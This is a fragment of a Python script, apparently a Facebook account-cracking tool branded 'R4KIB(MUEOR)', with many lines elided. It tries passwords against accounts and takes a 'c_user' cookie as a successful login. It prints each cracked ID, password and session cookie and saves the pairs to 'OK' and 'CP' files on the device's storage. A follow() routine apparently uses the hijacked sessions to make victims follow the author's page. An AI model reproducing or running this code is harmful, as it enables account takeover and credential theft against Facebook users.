...
def o():
    ...
    if opt == '2':
        ...
        os.system('xdg-open https://www.facebook.com/R4KIB(MUEOR).hasan.official.0')

        return None

    if opt == '3':

        os.system('xdg-open https://youtube.com/@R4KIB(MUEOR)Tech-vg9cm')
...
def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://www.facebook.com/MUEOR', {
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;32m[R4KIB(MUEOR)-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/R4KIB(MUEOR)-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('    \33[1;30m[R4KIB(MUEOR)-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/R4KIB(MUEOR)-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write(' %s[R4KIB(MUEOR)] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
